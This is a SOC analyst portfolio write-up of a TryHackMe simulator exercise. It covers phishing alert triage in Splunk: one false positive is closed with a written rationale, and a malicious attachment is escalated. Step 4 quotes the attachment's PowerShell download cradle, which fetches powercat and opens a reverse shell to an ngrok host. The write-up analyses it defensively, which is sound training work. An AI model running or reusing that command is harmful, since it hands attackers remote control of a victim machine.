# SOC L1 Alert Triage - TryHackMe SOC Simulator

---

## Objective
This project documents hands-on L1 SOC analyst experience completed 
using TryHackMe's live SOC Simulator - a real-time environment that 
replicates the full alert triage workflow used in professional Security 
Operations Centers. Alerts arrive live on a SIEM dashboard at realistic 
intervals, requiring prioritization, investigation, verdict determination, 
escalation decisions, and case documentation - exactly as performed by 
a working SOC analyst.

This walkthrough covers a **phishing scenario** worked from initial alert 
through full queue triage, demonstrating both accurate False Positive 
identification and True Positive escalation of a malicious payload 
containing a PowerShell reverse shell.

---

## MITRE ATT&CK Coverage

| Technique | ID | Description |
|---|---|---|
| Phishing | T1566.001 | Spearphishing Attachment |
| Command & Control | T1059.001 | PowerShell |
| Command & Control | T1105 | Ingress Tool Transfer |
| Command & Control | T1071 | Application Layer Protocol |
| Persistence | T1546 | Event Triggered Execution |
| Lateral Movement | T1021 | Remote Services |
| Exfiltration | T1041 | Exfiltration Over C2 Channel |

---

## Tools & Technologies

- **TryHackMe SOC Simulator** - Live SOC environment with real-time alerts
- **Splunk Enterprise** - SIEM platform used for log investigation and pivoting
- **Analyst VM / Sandbox** - Isolated environment for safe attachment analysis
- **PowerShell** - Used to inspect malicious `.lnk` file contents
- **MITRE ATT&CK Framework** - Technique identification and mapping
- **Incident Playbooks** - Structured triage and escalation procedures

---

## SOC Triage Workflow
```
1. ALERT ARRIVES
   └── Severity | Time | Rule Name | Affected Asset/User/IP

2. PRIORITIZATION
   └── New + Unresolved only
   └── Sort: Critical → High → Medium → Low
   └── Assign to self

3. INVESTIGATION
   └── Review alert details and raw logs
   └── Pivot in Splunk - same sender / same recipient / same time window
   └── Open attachments in Analyst VM sandbox if present
   └── Enrich: VirusTotal, threat intel lookups, PowerShell inspection

4. VERDICT & ESCALATION
   └── Close as False Positive with documented rationale
   └── Escalate to L2 if: confirmed malicious activity, C2 indicators,
       payload execution risk, or containment required

5. DOCUMENTATION
   └── Case notes during investigation
   └── Final incident report: findings, verdict, recommended next steps
```

---

## Walkthrough

### Step 1 - Alert Queue Review and Prioritization

Alerts arrive in real time on the SOC dashboard. The queue is sorted 
by severity and worked in order - Critical first, then High, Medium, 
and Low. Each alert is assigned before investigation begins to reflect 
real SOC ownership protocols.

<img width="1492" height="804" alt="418625994-bd557834-3f04-48a6-a00f-1e9cc9ddb497" src="https://github.com/user-attachments/assets/7a510632-1cf1-4321-9ace-dccac12e51c9" />


**Alert 1000** is the first assigned alert: a low-severity phishing 
alert flagged by the rule *"Suspicious email from external domain."* 
The alert details show the full email metadata — sender 
`boone@hatventuresworldwide.online`, recipient 
`miguel.odonnell@tryhatme.com`, subject line 
*"You've Won a Free Trip to Hat Wonderland - Click Here to Claim"*, 
no attachment, inbound direction, timestamped 03/03/2025 at 14:42.

---

### Step 2 - SIEM Investigation in Splunk

With the alert details in hand, the next step is pivoting into Splunk 
to search for any related activity associated with the sender domain.

<img width="1521" height="921" alt="418626988-0c271c6f-5790-4fa4-8dee-b7c302ab0f16" src="https://github.com/user-attachments/assets/5559c100-3e58-4858-80ee-2e5e879d7453" />


Searching `*boone@hatventuresworldwide.online*` returns a single 
matched event confirming the email log. All fields are examined: 
no attachment, content removed per privacy policy, one inbound 
event only, no reply or follow-on activity detected. The unusual 
`.online` top-level domain triggered the detection rule, but no 
further malicious indicators are present.

**Verdict: False Positive.** The detection rule flagged an unusual 
TLD, but investigation confirmed no malicious activity.

---

### Step 3 - False Positive Closure with Documented Rationale

The simulator requires written justification for every verdict - 
matching real SOC documentation standards.

<img width="1507" height="882" alt="418633905-b61d5aac-56e2-4f89-a483-87b55a868ec5" src="https://github.com/user-attachments/assets/0bc061f8-1d5d-43b6-b629-cb5cd9c758cd" />


Alert 1000 is closed as **False Positive** with the rationale 
documented before closure is confirmed.

<img width="1444" height="951" alt="418634002-f2c04130-145a-4716-8342-ade622616c3b" src="https://github.com/user-attachments/assets/81660ad1-b5de-423b-9401-73b75c2f180a" />


The completed incident report documents the full investigation:

- **Data Source:** Emails
- **Steps Taken:** Reviewed Splunk logs for related email 
  correspondence; confirmed no reply to the original email
- **Results:** No further actions or replies detected; 
  domain `hatventuresworldwide.online` flagged as unusual 
  but no malicious activity identified
- **Determination:** False Positive
- **Rationale:** Initial suspicion based on unusual TLD; 
  no further suspicious activity or follow-up actions identified

---

### Step 4 - Continued Triage: Malicious Attachment Discovery

Triage continues through the alert queue as new alerts arrive. 
A subsequent alert flags an email with an attachment. The 
attachment is opened in the **Analyst VM sandbox** for safe inspection.

Using the `more` command in PowerShell to read the contents of 
the attached `.lnk` file reveals the embedded payload:

<img width="1270" height="600" alt="418708856-ff052ee4-bed4-458e-8843-46568bf58437" src="https://github.com/user-attachments/assets/fa7aebc0-a460-4fce-a4c4-8dad17c9db81" />


The `.lnk` file (`invioce.pdf.lnk`) contains a PowerShell download 
cradle that executes the following chain on the victim machine:
```powershell
IEX(New-Object System.Net.WebClient).DownloadString(
  'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'
); 
powercat -c 2.tcp.ngrok.io -p 19282 -e powershell
```

**What this does:**
- Downloads `powercat.ps1` — a PowerShell networking tool — 
  directly from GitHub into memory using `IEX` (Invoke-Expression), 
  leaving no file on disk
- Immediately establishes a **reverse shell** back to the attacker's 
  ngrok-tunneled endpoint at `2.tcp.ngrok.io:19282`
- Passes a live PowerShell session to the attacker, enabling 
  full remote command execution on the victim machine

**Threat assessment:** If executed, this payload enables:
- **C2** - Full remote control via reverse PowerShell shell
- **Persistence** - Attacker can deploy additional payloads
- **Lateral movement** - Compromised host used as pivot point
- **Data exfiltration** - Direct access to all files and credentials

**Verdict: True Positive. Escalate to L2 immediately.**

---

## Summary of Cases Triaged

| Alert ID | Type | Verdict | Key Finding |
|---|---|---|---|
| 1000 | Suspicious email - external domain | False Positive | Unusual TLD, no malicious activity confirmed in Splunk |
| Subsequent | Suspicious attachment | True Positive - Escalate | `.lnk` file contains PowerShell reverse shell via powercat |

---

## Key Takeaways

- Completed end-to-end L1 SOC triage workflow including alert 
  prioritization, SIEM investigation, sandbox analysis, verdict 
  determination, and incident documentation
- Accurately identified a **False Positive** - preventing alert 
  fatigue and unnecessary escalation while documenting clear rationale
- Accurately identified a **True Positive** - recognizing a fileless 
  PowerShell payload using `IEX` download cradle and `powercat` reverse 
  shell before execution
- Demonstrated cross-source investigation: alert queue → Splunk 
  log pivot → Analyst VM sandbox inspection
- Incident reports written to professional SOC documentation standards

---

## SOC Skills Demonstrated

- Live alert triage in SIEM environment (Splunk Enterprise)
- Severity-based alert prioritization and queue management
- SIEM log pivoting and IOC-based searching
- Sandbox-based attachment analysis
- PowerShell payload analysis and reverse shell identification
- Fileless malware recognition (IEX download cradle, in-memory execution)
- True Positive / False Positive determination with documented rationale
- Incident report writing to professional SOC standards
- MITRE ATT&CK technique mapping across full attack chain
